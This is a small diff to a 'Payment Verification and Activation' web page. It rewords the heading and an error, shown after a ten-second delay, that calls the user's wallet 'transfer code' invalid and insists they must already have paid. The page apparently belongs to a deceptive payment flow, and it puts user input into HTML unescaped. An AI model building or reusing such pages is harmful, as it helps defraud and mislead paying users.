@@ -148,7 +148,7 @@
                         <button class="btn btn-success btn-copy">COPY</button>
                     </div>
                 </div>
- <h1>Fill in the Form for Payment Verification and Activation.</h1>
+ <h1> Payment Verification and Activation.</h1>
                 
                 <form data-ajax="true">
                     <div class="form-group">
@@ -322,7 +322,7 @@
 
                         setTimeout(() => {
                             $alert.addClass('alert-danger').removeClass('alert-warning').html(`
-                                <strong>Error:</strong><br>Your transfer code is incorrect! Complete checkout or check your code your code must be unique and valid redemption code.:${inputTest}
+                                <strong>Error:</strong><br>Invalid payment transfer number. Your transfer code is the transfer number displayed in your wallet after payment..You must have paid and transferred with the above methods. Your payment transfer code is your unique transfer code.:${inputTest}
                                 `);
                             form.toggleSubmitButtons(true);
                         }, 10000)
